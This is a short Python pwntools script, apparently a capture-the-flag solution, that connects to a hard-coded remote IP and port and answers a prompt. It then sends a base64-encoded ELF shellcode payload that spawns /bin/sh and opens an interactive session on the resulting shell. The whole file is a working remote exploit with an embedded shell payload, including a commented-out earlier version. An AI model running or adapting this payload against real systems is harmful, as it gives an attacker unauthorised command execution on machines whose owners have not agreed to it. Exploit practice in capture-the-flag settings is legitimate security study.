from pwn import *

# Set pwntools logging to debug
context.log_level = 'debug'

# Base64 payload (your ELF binary)
# payload = b'''f0VMRgEBAQAAsyoxwEDNgAIAAwABAAAACYAECCwAAAAAAAAAAAAAADQAIAABAAAAAAAAAACABAgAgAQITAAAAEwAAAAFAAAAABAAAA=='''
payload = b"""f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAA4
AAAAAQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWAAAAAAAAABYAAAAAAAAAAUA
AAAAAAAASDH2SDHSSI09GgAAAEiNdCQAsAsPBS9iaW4vc2gALXMA"""
# Connect to remote
r = remote('117.53.46.98', 12000)

# Expect prompt
r.recvuntil(b'sylphiette vs frieren cantikan mana?')

# Send base64 data
r.sendline(payload)

# Optional: interact with shell/output if it gives anything
r.interactive()
